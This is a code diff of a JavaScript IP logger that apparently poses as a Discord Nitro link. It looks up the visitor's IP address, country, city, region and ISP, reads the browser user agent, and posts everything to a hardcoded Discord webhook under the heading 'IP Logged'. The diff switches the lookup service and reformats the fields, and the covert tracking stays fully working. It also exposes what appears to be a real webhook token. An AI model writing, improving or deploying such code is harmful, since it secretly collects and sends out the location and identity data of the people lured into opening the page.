@@ -6,23 +6,23 @@
 const WEBHOOK = "https://discord.com/api/webhooks/1517646419182485525/HboDIfUeTnj-mDQJ59sFeBdAssozVQZq9xEz2Xw-elr6oTh5HHeHKUddaiMqLJ-A-NaJ";
 const REDIRECT = "https://discord.com/nitro";
 
-fetch("https://ip-api.com/json/?fields=query,country,city,isp,org,regionName")
+fetch("https://ipinfo.io/json")
   .then(r => r.json())
   .then(data => {
     return fetch(WEBHOOK, {
       method: "POST",
-      headers: {"Content-Type": "application/json"},
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         embeds: [{
           title: "🎯 IP Logged",
           color: 0xff2200,
           fields: [
-            {name: "🌐 IP", value: "`" + data.query + "`", inline: true},
-            {name: "🗺️ Country", value: data.country || "?", inline: true},
-            {name: "🏙️ City", value: data.city || "?", inline: true},
-            {name: "📍 Region", value: data.regionName || "?", inline: true},
-            {name: "📡 ISP", value: data.isp || "?", inline: false},
-            {name: "🖥️ User Agent", value: "`" + navigator.userAgent.slice(0, 200) + "`", inline: false}
+            { name: "🌐 IP",      value: "`" + (data.ip || "?") + "`",      inline: true  },
+            { name: "🗺️ Country", value: data.country || "?",               inline: true  },
+            { name: "🏙️ City",    value: data.city || "?",                  inline: true  },
+            { name: "📍 Region",  value: data.region || "?",                inline: true  },
+            { name: "📡 ISP",     value: data.org || "?",                   inline: false },
+            { name: "🖥️ UA",      value: "`" + navigator.userAgent.slice(0, 200) + "`", inline: false }
           ]
         }]
       })
